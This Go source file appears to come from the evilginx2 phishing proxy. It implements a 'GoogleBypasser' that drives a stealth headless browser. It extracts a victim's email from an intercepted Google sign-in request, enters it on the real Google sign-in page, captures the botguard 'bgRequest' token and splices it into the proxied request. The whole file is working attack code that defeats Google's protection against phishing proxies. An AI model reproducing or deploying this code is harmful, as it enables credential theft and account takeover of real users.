package core

import (
	"bytes"
	"regexp"
	"strings"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"github.com/go-rod/stealth"
	"github.com/kgretzky/evilginx2/log"
)

type GoogleBypasser struct {
	browser        *rod.Browser
	page           *rod.Page
	isHeadless     bool
	withDevTools   bool
	slowMotionTime time.Duration

	token string
	email string
}

var bgRegexp = regexp.MustCompile("bgRequest=[^&]*")

func (b *GoogleBypasser) Launch() {
	u := launcher.New().
		Headless(b.isHeadless).
		Devtools(b.withDevTools).
		NoSandbox(true).
		MustLaunch()
	b.browser = rod.New().ControlURL(u)
	if b.slowMotionTime > 0 {
		b.browser = b.browser.SlowMotion(b.slowMotionTime)
	}
	b.browser = b.browser.MustConnect()
	b.page = stealth.MustPage(b.browser)
}

func (b *GoogleBypasser) GetEmail(body []byte) {
	exp := regexp.MustCompile(`f\.req=%5B%22(.*?)%22`)
	email_match := exp.FindSubmatch(body)
	matches := len(email_match)
	if matches != 2 {
		log.Error("[GoogleBypasser]: Found %v matches for email, expecting 2", matches)
		return
	}
	b.email = string(bytes.Replace(email_match[1], []byte("%40"), []byte("@"), -1))
}

func (b *GoogleBypasser) GetToken() {
	stop := make(chan struct{})

	go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		if strings.Contains(e.Request.URL, "accountlookup?") {
			b.token = bgRegexp.FindString(e.Request.PostData)
			log.Debug("[GoogleBypasser]: %v", b.token)
			close(stop)
		}
	})()

	b.page.MustNavigate("https://accounts.google.com/signin/v2/identifier")
	b.page.MustElement("#identifierId").MustInput(b.email).MustPress(input.Enter)
	<-stop
}

func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
	return bgRegexp.ReplaceAll(body, []byte(b.token))
}
